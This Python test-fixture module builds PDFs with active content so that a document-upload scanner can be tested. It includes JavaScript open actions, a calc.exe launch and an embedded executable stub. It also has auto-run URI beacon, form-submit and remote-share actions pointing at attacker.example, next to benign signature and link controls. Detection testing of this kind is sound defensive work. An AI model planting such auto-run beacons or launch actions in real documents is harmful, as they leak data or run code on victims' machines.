"""PDFs written with pypdf for the upload check's tests; both suites import this file.

ocr/test_read_pages.py checks that inspect() names what each one carries;
tests/documents/test_upload_promotion.py runs the real check over them through the document
worker. Test code only: the image copies read_pages.py alone (ocr/Dockerfile).
"""

import io
from collections.abc import Callable

from pypdf import PdfWriter
from pypdf.generic import (
    ArrayObject,
    ByteStringObject,
    DictionaryObject,
    IndirectObject,
    NameObject,
    NumberObject,
    TextStringObject,
)


def written(edit: Callable[[PdfWriter], None] = lambda writer: None) -> bytes:
    writer = PdfWriter()
    writer.add_blank_page(width=595, height=842)
    edit(writer)
    buffer = io.BytesIO()
    writer.write(buffer)
    return buffer.getvalue()


def _name(value: str) -> NameObject:
    return NameObject(value)


def _action(kind: str, **entries: object) -> DictionaryObject:
    action = DictionaryObject({_name("/S"): _name(kind)})
    action.update({_name(f"/{key}"): value for key, value in entries.items()})
    return action


def open_action_javascript(writer: PdfWriter) -> None:
    writer.root_object[_name("/OpenAction")] = _action(
        "/JavaScript", JS=TextStringObject("app.alert(1)")
    )


def named_javascript(writer: PdfWriter) -> None:
    writer.add_js("app.alert(1)")


def page_action_javascript(writer: PdfWriter) -> None:
    writer.pages[0][_name("/AA")] = DictionaryObject(
        {_name("/O"): _action("/JavaScript", JS=TextStringObject("app.alert(1)"))}
    )


def launch(writer: PdfWriter) -> None:
    writer.root_object[_name("/OpenAction")] = _action("/Launch", F=TextStringObject("calc.exe"))


def embedded_file(writer: PdfWriter) -> None:
    writer.add_attachment("tool.exe", b"MZ\x90\x00")


def rich_media(writer: PdfWriter) -> None:
    annotation = DictionaryObject(
        {
            _name("/Type"): _name("/Annot"),
            _name("/Subtype"): _name("/RichMedia"),
            _name("/Rect"): ArrayObject([NumberObject(0)] * 4),
        }
    )
    writer.pages[0][_name("/Annots")] = ArrayObject([annotation])


def xfa(writer: PdfWriter) -> None:
    writer.root_object[_name("/AcroForm")] = DictionaryObject(
        {_name("/Fields"): ArrayObject(), _name("/XFA"): ArrayObject()}
    )


def signature_field(writer: PdfWriter) -> None:
    """What a signed e-diploma carries: a /Sig field and its value, and an open action that
    only shows the first page. None of it runs anything."""
    signature = DictionaryObject(
        {
            _name("/Type"): _name("/Sig"),
            _name("/Filter"): _name("/Adobe.PPKLite"),
            _name("/SubFilter"): _name("/adbe.pkcs7.detached"),
            _name("/ByteRange"): ArrayObject([NumberObject(0)] * 4),
            _name("/Contents"): ByteStringObject(b"\x00" * 64),
        }
    )
    field = DictionaryObject(
        {
            _name("/FT"): _name("/Sig"),
            _name("/T"): TextStringObject("Signature1"),
            _name("/V"): signature,
        }
    )
    writer.root_object[_name("/AcroForm")] = DictionaryObject(
        {_name("/Fields"): ArrayObject([field]), _name("/SigFlags"): NumberObject(3)}
    )
    writer.root_object[_name("/OpenAction")] = ArrayObject(
        [writer.pages[0].indirect_reference, _name("/Fit")]
    )


def open_action_uri(writer: PdfWriter) -> None:
    writer.root_object[_name("/OpenAction")] = _action(
        "/URI", URI=TextStringObject("https://attacker.example/beacon")
    )


def page_action_submit_form(writer: PdfWriter) -> None:
    writer.pages[0][_name("/AA")] = DictionaryObject(
        {_name("/O"): _action("/SubmitForm", F=TextStringObject("https://attacker.example/"))}
    )


def open_action_import_data(writer: PdfWriter) -> None:
    writer.root_object[_name("/OpenAction")] = _action(
        "/ImportData", F=TextStringObject("data.fdf")
    )


def open_action_go_to_remote(writer: PdfWriter) -> None:
    writer.root_object[_name("/OpenAction")] = _action(
        "/GoToR", F=TextStringObject("\\\\attacker.example\\share\\x.pdf"),
        D=ArrayObject([NumberObject(0), _name("/Fit")]),
    )


def chained_uri(writer: PdfWriter) -> None:
    """A harmless open action whose /Next runs a URI: still automatic."""
    writer.root_object[_name("/OpenAction")] = _action(
        "/GoTo",
        D=ArrayObject([writer.pages[0].indirect_reference, _name("/Fit")]),
        Next=_action("/URI", URI=TextStringObject("https://attacker.example/beacon")),
    )


def _looping_go_to(writer: PdfWriter) -> IndirectObject:
    """A /GoTo whose /Next is itself: legal syntax, and a loop for anything that follows it."""
    action = _action("/GoTo", D=ArrayObject([writer.pages[0].indirect_reference, _name("/Fit")]))
    reference = writer._add_object(action)
    action[_name("/Next")] = reference
    return reference


def cyclic_next(writer: PdfWriter) -> None:
    """A URI beacon on page open, beside a close action that loops on itself: the loop must
    end, and the beacon must still be seen."""
    writer.pages[0][_name("/AA")] = DictionaryObject(
        {
            _name("/O"): _action("/URI", URI=TextStringObject("https://attacker.example/beacon")),
            _name("/C"): _looping_go_to(writer),
        }
    )


def pure_loop(writer: PdfWriter) -> None:
    """An open action that loops on itself and runs nothing: not active content."""
    writer.root_object[_name("/OpenAction")] = _looping_go_to(writer)


def long_chain(writer: PdfWriter, length: int) -> None:
    """An open action followed by `length` distinct /GoTo actions through /Next."""
    page = writer.pages[0].indirect_reference
    following = None
    for _ in range(length):
        entries = {"D": ArrayObject([page, _name("/Fit")])}
        if following is not None:
            entries["Next"] = following
        following = writer._add_object(_action("/GoTo", **entries))
    writer.root_object[_name("/OpenAction")] = following


def link_uri(writer: PdfWriter) -> None:
    """A link the reader clicks: a /URI that runs only on a click is not active content."""
    annotation = DictionaryObject(
        {
            _name("/Type"): _name("/Annot"),
            _name("/Subtype"): _name("/Link"),
            _name("/Rect"): ArrayObject([NumberObject(0)] * 4),
            _name("/A"): _action("/URI", URI=TextStringObject("https://www.example.edu/")),
        }
    )
    writer.pages[0][_name("/Annots")] = ArrayObject([annotation])


#: Every active-content PDF, and exactly the names inspect() reports for it.
ACTIVE = {
    "open_action_javascript": (open_action_javascript, ["/JS", "/JavaScript", "/OpenAction"]),
    "named_javascript": (named_javascript, ["/JS", "/JavaScript"]),
    "page_action_javascript": (page_action_javascript, ["/AA", "/JS", "/JavaScript"]),
    "launch": (launch, ["/Launch", "/OpenAction"]),
    "embedded_file": (embedded_file, ["/EmbeddedFile", "/EmbeddedFiles"]),
    "rich_media": (rich_media, ["/RichMedia"]),
    "xfa": (xfa, ["/XFA"]),
    # Run with no click only because a trigger names them; a clicked link is fine (link_uri).
    "open_action_uri": (open_action_uri, ["/OpenAction", "/URI"]),
    "page_action_submit_form": (page_action_submit_form, ["/AA", "/SubmitForm"]),
    "open_action_import_data": (open_action_import_data, ["/ImportData", "/OpenAction"]),
    "open_action_go_to_remote": (open_action_go_to_remote, ["/GoToR", "/OpenAction"]),
    "chained_uri": (chained_uri, ["/OpenAction", "/URI"]),
    "cyclic_next": (cyclic_next, ["/AA", "/URI"]),
}
